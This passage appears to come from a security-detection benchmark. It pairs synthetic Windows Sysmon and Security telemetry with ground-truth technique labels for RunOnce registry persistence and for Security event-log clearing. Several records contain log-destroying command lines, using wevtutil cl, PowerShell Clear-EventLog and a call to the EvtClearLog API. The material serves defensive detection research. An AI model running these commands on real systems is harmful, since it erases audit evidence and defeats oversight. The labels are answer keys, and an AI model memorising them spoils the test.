      "ProcessId": 64896,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-44222\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\willow_elm_yew_1980c1",
      "User": "wlee",
      "UtcTime": "2026-02-11T11:46:36Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-11T11:46:36Z",
    "windows_event_id": 13
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "Details": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\reg.exe",
    "ProcessGuid": "{572ab730-fa34-ae22-4857-365b49fd8f61}",
    "ProcessId": 64896,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-44222\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\willow_elm_yew_1980c1",
    "User": "wlee",
    "UtcTime": "2026-02-11T11:46:36Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_E/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_4cd659d0",
        "fields": [
          "Details",
          "TargetObject"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "RunOnce plus an AppData executable is dual-use; the single event lacks enough context to distinguish software setup from persistence abuse.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_2d3b150e"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_df5410f4",
    "event_record_id": 12525124538628,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 11,
      "Image": "C:\\Windows\\explorer.exe",
      "ProcessGuid": "{0b643b99-5104-040a-9dcf-80457758687f}",
      "ProcessId": 64900,
      "TargetFilename": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
      "User": "wlee",
      "UtcTime": "2026-02-11T11:46:33Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-11T11:46:33Z",
    "windows_event_id": 11
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_4cd659d0",
    "event_record_id": 95840973683252,
    "fields": {
      "Computer": "WORKSTATION01",
      "Details": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\reg.exe",
      "ProcessGuid": "{572ab730-fa34-ae22-4857-365b49fd8f61}",
      "ProcessId": 64896,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-44222\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\willow_elm_yew_1980c1",
      "User": "wlee",
      "UtcTime": "2026-02-11T11:46:36Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-11T11:46:36Z",
    "windows_event_id": 13
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_4937419c",
    "event_record_id": 61053767563764,
    "fields": {
      "CommandLine": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=53ce93d3241300fc58c8955fea49cd770a57645c0837558382cb350e099046b4",
      "Image": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
      "LogonGuid": "{8cda67f5-f30f-d5c6-dbc8-47dc500d7510}",
      "LogonId": "0xfd81",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{0b643b99-5104-040a-9dcf-80457758687f}",
      "ParentProcessId": 64900,
      "ProcessGuid": "{37873020-b9f4-0e8a-c71d-d533bdeda0f5}",
      "ProcessId": 64904,
      "User": "wlee",
      "UtcTime": "2026-02-11T11:46:39Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-11T11:46:39Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 11,
    "Image": "C:\\Windows\\explorer.exe",
    "ProcessGuid": "{0b643b99-5104-040a-9dcf-80457758687f}",
    "ProcessId": 64900,
    "TargetFilename": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
    "User": "wlee",
    "UtcTime": "2026-02-11T11:46:33Z"
  },
  {
    "Computer": "WORKSTATION01",
    "Details": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\reg.exe",
    "ProcessGuid": "{572ab730-fa34-ae22-4857-365b49fd8f61}",
    "ProcessId": 64896,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-44222\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\willow_elm_yew_1980c1",
    "User": "wlee",
    "UtcTime": "2026-02-11T11:46:36Z"
  },
  {
    "CommandLine": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=53ce93d3241300fc58c8955fea49cd770a57645c0837558382cb350e099046b4",
    "Image": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
    "LogonGuid": "{8cda67f5-f30f-d5c6-dbc8-47dc500d7510}",
    "LogonId": "0xfd81",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{0b643b99-5104-040a-9dcf-80457758687f}",
    "ParentProcessId": 64900,
    "ProcessGuid": "{37873020-b9f4-0e8a-c71d-d533bdeda0f5}",
    "ProcessId": 64904,
    "User": "wlee",
    "UtcTime": "2026-02-11T11:46:39Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_E/contextual",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_4cd659d0",
        "fields": [
          "Computer",
          "Details",
          "TargetObject",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_df5410f4",
        "fields": [
          "TargetFilename"
        ]
      },
      {
        "event_id": "evt_4937419c",
        "fields": [
          "Computer",
          "Image",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The RunOnce value names the target path and a later process-creation record matches that image. Together they support an auto-start configuration, though they do not prove the logon trigger caused that process start.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_6b71e4a1"
}
```

## pair_07b63164
Family: TF_T1685_005_A; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_45e91c82",
    "event_record_id": 76642615492500,
    "fields": {
      "Computer": "DB01",
      "EventID": 1102,
      "SubjectLogonId": "0x3489",
      "SubjectUserName": "tjones",
      "TimeCreated": "2026-02-26T03:20:27Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-02-26T03:20:27Z",
    "windows_event_id": 1102
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 1102,
    "SubjectLogonId": "0x3489",
    "SubjectUserName": "tjones",
    "TimeCreated": "2026-02-26T03:20:27Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_A/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_45e91c82",
        "fields": [
          "EventID",
          "SubjectUserName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "EID 1102 establishes that the Security audit log was cleared, but does not identify wevtutil or adversarial intent.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_3e6ebb6a"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_0c8dc44f",
    "event_record_id": 40940000857214,
    "fields": {
      "CommandLine": "wevtutil.exe cl Security /bu:C:\\ProgramData\\spruce_fir_maple_07b631\\security.evtx",
      "Computer": "DB01",
      "EventID": 4688,
      "NewProcessId": "0x348c",
      "NewProcessName": "C:\\Windows\\System32\\wevtutil.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x3484",
      "SubjectLogonId": "0x3489",
      "SubjectUserName": "tjones",
      "TargetUserName": "tjones",
      "TimeCreated": "2026-02-26T03:20:24Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-26T03:20:24Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_45e91c82",
    "event_record_id": 76642615492500,
    "fields": {
      "Computer": "DB01",
      "EventID": 1102,
      "SubjectLogonId": "0x3489",
      "SubjectUserName": "tjones",
      "TimeCreated": "2026-02-26T03:20:27Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-02-26T03:20:27Z",
    "windows_event_id": 1102
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "wevtutil.exe cl Security /bu:C:\\ProgramData\\spruce_fir_maple_07b631\\security.evtx",
    "Computer": "DB01",
    "EventID": 4688,
    "NewProcessId": "0x348c",
    "NewProcessName": "C:\\Windows\\System32\\wevtutil.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x3484",
    "SubjectLogonId": "0x3489",
    "SubjectUserName": "tjones",
    "TargetUserName": "tjones",
    "TimeCreated": "2026-02-26T03:20:24Z"
  },
  {
    "Computer": "DB01",
    "EventID": 1102,
    "SubjectLogonId": "0x3489",
    "SubjectUserName": "tjones",
    "TimeCreated": "2026-02-26T03:20:27Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_A/contextual",
  "evidence_refs": {
    "T1685.005": [
      {
        "event_id": "evt_45e91c82",
        "fields": [
          "Computer",
          "EventID",
          "SubjectLogonId",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_0c8dc44f",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "SubjectLogonId",
          "TimeCreated"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The linked wevtutil process explicitly clears the Security log and supplies the mechanism missing from EID 1102.",
  "technique_ids": [
    "T1685.005"
  ],
  "technique_names": [
    "Clear Windows Event Logs"
  ],
  "view_id": "view_4ad2cf61"
}
```

## pair_1518061d
Family: TF_T1685_005_B; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_c5d05022",
    "event_record_id": 225477682825038,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 1102,
      "SubjectLogonId": "0xcc55",
      "SubjectUserName": "jsmith",
      "TimeCreated": "2026-01-28T06:40:39Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-01-28T06:40:39Z",
    "windows_event_id": 1102
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 1102,
    "SubjectLogonId": "0xcc55",
    "SubjectUserName": "jsmith",
    "TimeCreated": "2026-01-28T06:40:39Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_B/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_c5d05022",
        "fields": [
          "EventID",
          "SubjectLogonId"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The audit-log-cleared event is genuine telemetry but cannot identify a PowerShell mechanism from the anchor alone.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_95ae74ee"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_ac0cfafc",
    "event_record_id": 177477053351009,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Clear-EventLog -LogName Security; Write-Output fir_aspen_beech_151806\"",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{49bbfdf8-e553-5f40-5e65-e7a9977fb5fb}",
      "LogonId": "0xcc55",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "{e0421d6e-d503-1e53-79c8-5c9bb5fb168e}",
      "ParentProcessId": 52304,
      "ProcessGuid": "{a16a18b8-8461-1bfb-00b2-b1802d5184ae}",
      "ProcessId": 52312,
      "User": "jsmith",
      "UtcTime": "2026-01-28T06:40:36Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-28T06:40:36Z",
    "windows_event_id": 1
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_c5d05022",
    "event_record_id": 225477682825038,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 1102,
      "SubjectLogonId": "0xcc55",
      "SubjectUserName": "jsmith",
      "TimeCreated": "2026-01-28T06:40:39Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-01-28T06:40:39Z",
    "windows_event_id": 1102
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Clear-EventLog -LogName Security; Write-Output fir_aspen_beech_151806\"",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{49bbfdf8-e553-5f40-5e65-e7a9977fb5fb}",
    "LogonId": "0xcc55",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessGuid": "{e0421d6e-d503-1e53-79c8-5c9bb5fb168e}",
    "ParentProcessId": 52304,
    "ProcessGuid": "{a16a18b8-8461-1bfb-00b2-b1802d5184ae}",
    "ProcessId": 52312,
    "User": "jsmith",
    "UtcTime": "2026-01-28T06:40:36Z"
  },
  {
    "Computer": "WORKSTATION01",
    "EventID": 1102,
    "SubjectLogonId": "0xcc55",
    "SubjectUserName": "jsmith",
    "TimeCreated": "2026-01-28T06:40:39Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_B/contextual",
  "evidence_refs": {
    "T1685.005": [
      {
        "event_id": "evt_c5d05022",
        "fields": [
          "Computer",
          "EventID",
          "SubjectLogonId",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_ac0cfafc",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "LogonId",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "PowerShell Clear-EventLog or equivalent log-clear syntax is visible in the linked process event, so T1685.005 is supported.",
  "technique_ids": [
    "T1685.005"
  ],
  "technique_names": [
    "Clear Windows Event Logs"
  ],
  "view_id": "view_f0c63b64"
}
```

## pair_261392da
Family: TF_T1685_005_C; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_2e2b732f",
    "event_record_id": 137750491111726,
    "fields": {
      "Computer": "DB01",
      "EventID": 1102,
      "SubjectLogonId": "0x21bd",
      "SubjectUserName": "jsmith",
      "TimeCreated": "2026-02-17T15:14:25Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-02-17T15:14:25Z",
    "windows_event_id": 1102
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 1102,
    "SubjectLogonId": "0x21bd",
    "SubjectUserName": "jsmith",
    "TimeCreated": "2026-02-17T15:14:25Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_C/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_2e2b732f",
        "fields": [
          "EventID",
          "SubjectUserName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The anchor only reports the result of log clearing; an API mechanism is not visible in EID 1102.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_f24f2614"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_9915cd47",
    "event_record_id": 210384734690140,
    "fields": {
      "CommandLine": "C:\\ProgramData\\birch_ash_beech_261392\\loghelper.exe --api EvtClearLog --channel Security --archive C:\\ProgramData\\birch_ash_beech_261392\\security.evtx",
      "Computer": "DB01",
      "EventID": 4688,
      "NewProcessId": "0x21c0",
      "NewProcessName": "C:\\ProgramData\\birch_ash_beech_261392\\loghelper.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x21b8",
      "SubjectLogonId": "0x21bd",
      "SubjectUserName": "jsmith",
      "TargetUserName": "jsmith",
      "TimeCreated": "2026-02-17T15:14:22Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-17T15:14:22Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_2e2b732f",
    "event_record_id": 137750491111726,
    "fields": {
      "Computer": "DB01",
      "EventID": 1102,
      "SubjectLogonId": "0x21bd",
      "SubjectUserName": "jsmith",
      "TimeCreated": "2026-02-17T15:14:25Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-02-17T15:14:25Z",
    "windows_event_id": 1102
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\ProgramData\\birch_ash_beech_261392\\loghelper.exe --api EvtClearLog --channel Security --archive C:\\ProgramData\\birch_ash_beech_261392\\security.evtx",
    "Computer": "DB01",
    "EventID": 4688,
    "NewProcessId": "0x21c0",
    "NewProcessName": "C:\\ProgramData\\birch_ash_beech_261392\\loghelper.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x21b8",
    "SubjectLogonId": "0x21bd",
    "SubjectUserName": "jsmith",
    "TargetUserName": "jsmith",
    "TimeCreated": "2026-02-17T15:14:22Z"
  },
  {
    "Computer": "DB01",
    "EventID": 1102,
    "SubjectLogonId": "0x21bd",
    "SubjectUserName": "jsmith",
    "TimeCreated": "2026-02-17T15:14:25Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_C/contextual",
  "evidence_refs": {
    "T1685.005": [
      {
        "event_id": "evt_2e2b732f",
        "fields": [
          "Computer",
          "EventID",
          "SubjectLogonId",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_9915cd47",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "SubjectLogonId",
          "TimeCreated"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The linked process command explicitly calls the event-log clear API and is temporally related to EID 1102.",
  "technique_ids": [
    "T1685.005"
  ],
  "technique_names": [
    "Clear Windows Event Logs"
  ],
  "view_id": "view_5dce2de4"
}
```

## pair_806f2fcf
Family: TF_T1685_005_DEV; split: dev
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_ba244cee",
    "event_record_id": 240383329068995,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 1102,
      "SubjectLogonId": "0x79f1",
      "SubjectUserName": "jsmith",
      "TimeCreated": "2026-01-30T15:46:32Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-01-30T15:46:32Z",
    "windows_event_id": 1102
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 1102,
    "SubjectLogonId": "0x79f1",
    "SubjectUserName": "jsmith",
    "TimeCreated": "2026-01-30T15:46:32Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_DEV/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_ba244cee",
        "fields": [
          "EventID",
          "SubjectLogonId"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "EID 1102 establishes a cleared Security audit log but does not identify the PowerShell mechanism in the single view.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_52209150"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_3c80b95f",
    "event_record_id": 154460980972574,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Clear-EventLog -LogName Security; Write-Output elm_birch_fir_806f2f\"",
      "Computer": "WORKSTATION01",
      "EventID": 4688,
      "NewProcessId": "0x79f4",
      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ParentProcessName": "C:\\Windows\\System32\\wsmprovhost.exe",
      "ProcessId": "0x79ec",
      "SubjectLogonId": "0x79f1",
      "SubjectUserName": "jsmith",
      "TargetUserName": "jsmith",
      "TimeCreated": "2026-01-30T15:46:29Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-30T15:46:29Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_ba244cee",
    "event_record_id": 240383329068995,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 1102,
      "SubjectLogonId": "0x79f1",
      "SubjectUserName": "jsmith",
      "TimeCreated": "2026-01-30T15:46:32Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-01-30T15:46:32Z",
    "windows_event_id": 1102
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Clear-EventLog -LogName Security; Write-Output elm_birch_fir_806f2f\"",
    "Computer": "WORKSTATION01",
    "EventID": 4688,
    "NewProcessId": "0x79f4",
    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentProcessName": "C:\\Windows\\System32\\wsmprovhost.exe",
    "ProcessId": "0x79ec",
    "SubjectLogonId": "0x79f1",
    "SubjectUserName": "jsmith",
    "TargetUserName": "jsmith",
    "TimeCreated": "2026-01-30T15:46:29Z"
  },
  {
    "Computer": "WORKSTATION01",
    "EventID": 1102,
    "SubjectLogonId": "0x79f1",
    "SubjectUserName": "jsmith",
    "TimeCreated": "2026-01-30T15:46:32Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_DEV/contextual",
  "evidence_refs": {
    "T1685.005": [
      {
        "event_id": "evt_ba244cee",
        "fields": [
          "Computer",
          "EventID",
          "SubjectLogonId",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_3c80b95f",
        "fields": [
          "CommandLine",
          "Computer",
          "SubjectLogonId",
          "TimeCreated"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "A linked PowerShell Clear-EventLog process supplies the mechanism evidence for T1685.005.",
  "technique_ids": [
    "T1685.005"
  ],
  "technique_names": [
    "Clear Windows Event Logs"
  ],
  "view_id": "view_faa08932"
}
```

## pair_0c691d76
Family: TF_T1685_005_E; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_3bb7a9ea",
    "event_record_id": 201583495990260,
    "fields": {
      "Computer": "DB01",
      "EventID": 1102,
      "SubjectLogonId": "0xb365",
      "SubjectUserName": "mchen",
      "TimeCreated": "2026-06-18T23:38:39Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-06-18T23:38:39Z",
    "windows_event_id": 1102
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 1102,
    "SubjectLogonId": "0xb365",
    "SubjectUserName": "mchen",
    "TimeCreated": "2026-06-18T23:38:39Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_E/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_3bb7a9ea",
        "fields": [
          "EventID",
          "SubjectLogonId"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "EID 1102 confirms clearing but is insufficient to attribute a mechanism or adversarial context.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_0877f3fc"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_fd58b2cd",
    "event_record_id": 129605411996353,
    "fields": {
      "Computer": "DB01",
      "DestinationIp": "198.51.100.30",
      "DestinationPort": 445,
      "EventID": 3,
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "ProcessGuid": "{75e01c8b-02c1-c8f6-2b7e-69e39d4a8cf5}",
      "ProcessId": 45928,
      "Protocol": "tcp",
      "SourceIp": "203.0.113.40",
      "SourcePort": 49801,
      "User": "mchen",
      "UtcTime": "2026-06-18T23:38:33Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-18T23:38:33Z",
    "windows_event_id": 3
  },
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_00d584f0",
    "event_record_id": 177847451478346,
    "fields": {
      "CommandLine": "wevtutil.exe cl Security /bu:C:\\ProgramData\\pine_fir_larch_0c691d\\security.evtx",
      "Computer": "DB01",
      "EventID": 4688,
      "NewProcessId": "0xb36c",
      "NewProcessName": "C:\\Windows\\System32\\wevtutil.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0xb360",
      "SubjectLogonId": "0xb365",
      "SubjectUserName": "mchen",
      "TargetUserName": "mchen",
      "TimeCreated": "2026-06-18T23:38:36Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-18T23:38:36Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_3bb7a9ea",
    "event_record_id": 201583495990260,
    "fields": {
      "Computer": "DB01",
      "EventID": 1102,
      "SubjectLogonId": "0xb365",
      "SubjectUserName": "mchen",
      "TimeCreated": "2026-06-18T23:38:39Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-06-18T23:38:39Z",
    "windows_event_id": 1102
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "DB01",
    "DestinationIp": "198.51.100.30",
    "DestinationPort": 445,
    "EventID": 3,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "ProcessGuid": "{75e01c8b-02c1-c8f6-2b7e-69e39d4a8cf5}",
    "ProcessId": 45928,
    "Protocol": "tcp",
    "SourceIp": "203.0.113.40",
    "SourcePort": 49801,
    "User": "mchen",
    "UtcTime": "2026-06-18T23:38:33Z"
  },
  {
    "CommandLine": "wevtutil.exe cl Security /bu:C:\\ProgramData\\pine_fir_larch_0c691d\\security.evtx",
    "Computer": "DB01",
    "EventID": 4688,
    "NewProcessId": "0xb36c",
    "NewProcessName": "C:\\Windows\\System32\\wevtutil.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0xb360",
    "SubjectLogonId": "0xb365",
    "SubjectUserName": "mchen",
    "TargetUserName": "mchen",
    "TimeCreated": "2026-06-18T23:38:36Z"
  },
  {
    "Computer": "DB01",
    "EventID": 1102,
    "SubjectLogonId": "0xb365",
    "SubjectUserName": "mchen",
    "TimeCreated": "2026-06-18T23:38:39Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1685_005_E/contextual",
  "evidence_refs": {
    "T1685.005": [
      {
        "event_id": "evt_3bb7a9ea",
        "fields": [
          "Computer",
          "EventID",
          "SubjectLogonId",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_fd58b2cd",
        "fields": [
